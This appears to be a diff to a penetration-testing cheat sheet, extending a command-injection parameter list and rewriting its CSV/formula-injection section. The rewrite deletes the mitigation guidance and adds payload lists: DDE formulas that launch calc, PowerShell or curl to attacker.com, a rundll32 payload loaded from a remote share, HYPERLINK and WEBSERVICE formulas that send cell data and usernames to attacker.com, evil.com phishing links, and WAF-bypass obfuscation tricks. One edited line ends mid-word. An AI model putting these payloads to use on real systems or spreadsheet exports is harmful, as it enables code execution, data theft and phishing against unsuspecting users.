@@ -2071,7 +2071,7 @@ PoC message: "Subdomain takeover by <your-name>"
 
 ## 13. Command Injection
 ```
-cmd, command, execute, exec, run, shell, process, task, action, operation, script, script_path, script_name, filename, filepath, file, path, dir, directory, target, ip, host, hostname, ping, traceroute, nslookup, dns, lookup, port, interface, netstat, subnet, mask, gateway, route, user, username, account, name, key, token, id, uid, gid, group, env, env_var, variable, config, config_path, config_file, backup, restore, upload, download, log, log_path, log_file, debug, trace, monitor, scan, scanner, tool, utility
+cmd, command, execute, exec, run, shell, process, task, action, operation, script, script_path, script_name, filename, filepath, file, path, dir, directory, target, ip, host, hostname, ping, traceroute, nslookup, dns, lookup, port, interface, netstat, subnet, mask, gateway, route, user, username, account, name, key, token, id, uid, gid, group, env, env_var, variable, config, config_path, config_file, backup, restore, upload, download, log, log_path, log_file, debug, trace, monitor, scan, scanner, tool, utility, filename, darmon, host, upload, dir, execute, download, log, ip, cli, cmd, file=, email
 ```
 ### Tool:
 - [Commix](https://github.com/commixproject/commix)
@@ -2080,17 +2080,7 @@ cmd, command, execute, exec, run, shell, process, task, action, operation, scrip
 * `&&` (AND): Execute the second command only if the first command succeeds (returns a zero exit status).
 * `||` (OR): Execute the second command only if the first command fails (returns a non-zero exit status).
 * `&` (Background): Execute the command in the background, allowing the user to continue using the shell.
-* `|` (Pipe):  Takes the output of the first command and uses it as the input for the second command.
-
-```powershell
-command1; command2   # Execute command1 and then command2
-command1 && command2 # Execute command2 only if command1 succeeds
-command1 || command2 # Execute command2 only if command1 fails
-command1 & command2  # Execute command1 in the background
-command1 | command2  # Pipe the output of command1 into command2
-```
-**Possible Parameters:**
-`filename, darmon, host, upload, dir, execute, download, log, ip, cli, cmd, file=`
+* `|` (Pipe):  Takes the output of the first command and uses it as the input for the second comman
 
 # 🔹 Basic Command Injection Payloads
 
@@ -3660,14 +3650,6 @@ CSV Injection, also known as Formula Injection, occurs when an application allow
 3. Download the Excel file and open it.
 4. If the injected formula executes (e.g., launches the calculator), the application is vulnerable.
 
-> **Mistake:** Do not upload the Excel file back into the application for verification. This results in a false negative.
-```
-=
-+
-–
-@
-```
-
 ## Example Payloads
 ### Pop Calculator
 ```csv
@@ -3690,35 +3672,96 @@ DDE ("cmd";"/C calc";"!A0")A0
 ```csv
 =cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
 ```
+# 🔹 Basic CSV Injection Payloads
 
-## Technical Details
-- `cmd` is the command-line interpreter that the formula can invoke.
-- `/C calc` specifies the command to execute (`calc.exe` in this case).
-- `!A0` or similar references indicate where the formula should be placed in the spreadsheet.
+Simple Formula Execution : `=2+2` → Executes formula when opened in Excel  
+String Formula : `="Injected"` → Confirms formula parsing  
+Addition Test : `=1+1` → Returns `2`, confirms injection
 
-### Google Sheets
+# 🔹 Command Execution (Excel / DDE)
 
-Google Sheets allows some additionnal formulas that are able to fetch remote URLs:
+DDE Command (Windows): `=cmd|' /C calc'!A0` → Opens calculator (older Excel versions)
+PowerShell Execution : `=cmd|' /C powershell.exe'!A0` → Executes PowerShell
+Remote Command Execution : `=cmd|' /C curl attacker.com'!A0` → Sends request to attacker
 
-* [IMPORTXML](https://support.google.com/docs/answer/3093342?hl=en)(url, xpath_query, locale)
-* [IMPORTRANGE](https://support.google.com/docs/answer/3093340)(spreadsheet_url, range_string)
-* [IMPORTHTML](https://support.google.com/docs/answer/3093339)(url, query, index)
-* [IMPORTFEED](https://support.google.com/docs/answer/3093337)(url, [query], [headers], [num_items])
-* [IMPORTDATA](https://support.google.com/docs/answer/3093335)(url)
+# 🔹 Data Exfiltration Payloads
 
-So one can test blind formula injection or a potential for data exfiltration with:
+HTTP Exfiltration :  `=HYPERLINK("http://attacker.com/?data="&A1)` → Sends cell data
+Steal Username :  `=HYPERLINK("http://attacker.com/?user="&USER())`
+DNS Exfiltration :  `=HYPERLINK("http://"&A1&".attacker.com")`
+External Data Fetch + Remote URL Load :  `=WEBSERVICE("http://attacker.com")` → Triggers external request
 
-```c
-=IMPORTXML("http://burp.collaborator.net/csv", "//a/@href")
+# 🔹 Information Disclosure
+
+System Info :  `=INFO("system")` → Retrieves system details
+User Info :  `=USER()` → Current username
+File Paths :  `=CELL("filename")` → Reveals file location
+Malicious Link :  `=HYPERLINK("http://evil.com","Click Me")` → Triggers phishing
+Fake Login Prompt :  `=HYPERLINK("http://evil.com/login","Secure Login")`
+
+# 🔹 CSV Injection via Prefix Characters
+
+Formula Prefix : `=cmd` → Standard execution  
+Alt Prefix : `+cmd` → Executes in Excel  
+Minus Prefix : `-cmd` → Formula execution  
+At Symbol : `@cmd` → Works in some spreadsheet apps
+
+# 🔹 Context Breaking Payloads
+
+Cell Escape :  `",=cmd|' /C calc'!A0,"` → Break CSV structure
+New Row Injection :  `value\n=cmd|' /C calc'!A0` → Inject new row
+Column Break :  `value,=cmd|' /C calc'!A0` → New column injection
+
+# 🔹 WAF Bypass Techniques (CSV Injection)
+## 🧩 Formula Obfuscation
+
+Whitespace Trick : `= 1 + 1` → Bypass strict filters  
+Tab Injection : `=\t1+1` → Hidden execution  
+Newline Injection : `=\n1+1`
+
+## 🧩 Encoding Tricks
+
+URL Encoding : `%3Dcmd%7C%27%20/C%20calc%27!A0` → Encoded payload  
+Double Encoding : `%253Dcmd%257C...` → WAF bypass  
+Unicode Encoding : `\u003dcmd|' /C calc'!A0`
+
+## 🧩 String Concatenation
+
+String Split :  `="cm"&"d|' /C calc'!A0"` → Avoid detection
+Character Build :  `=CHAR(99)&CHAR(109)&CHAR(100)` → Builds "cmd"
+Join Trick :  `=CONCAT("c","md")`
+
+## 🧩 Prefix Bypass
+
+Space Prefix : `" =cmd|' /C calc'!A0"` → Bypass strict checks  
+Quote Prefix : `'=cmd|' /C calc'!A0` → Still executes in some cases
+
+## 🧩 Function Obfuscation
+
+Indirect Call :  `=INDIRECT("A1")` → Execute indirectly
+Nested Function :  `=HYPERLINK("http://evil.com","Click")`
+
+# 🔹 Brute Force CSV Payload List
+## ✅ Detection Payloads
 ```
-
-## Mitigation
-To prevent CSV injection:
-- Prefix user input with a single quote (`'`) to treat it as text.
-- Validate and sanitize user input before exporting.
-- Restrict export functionality if formula execution poses a security risk.
-
----
+=1+1
+=2+2
+="test"
++1+1
+@1+1
+=cmd|' /C calc'!A0
+=cmd|' /C whoami'!A0
+=cmd|' /C dir'!A0
+=HYPERLINK("http://attacker.com/?data="&A1)
+=WEBSERVICE("http://attacker.com")
+=IMPORTXML("http://attacker.com","//data")
+=INFO("system")
+=USER()
+=CELL("filename")
+%3D1%2B1
+%3Dcmd%7C...
+\u003d1+1
+```
 # Server-Side Template Injection (SSTI)
 
 Server-Side Template Injection (SSTI) can occur when an application allows users to modify templates, such as:
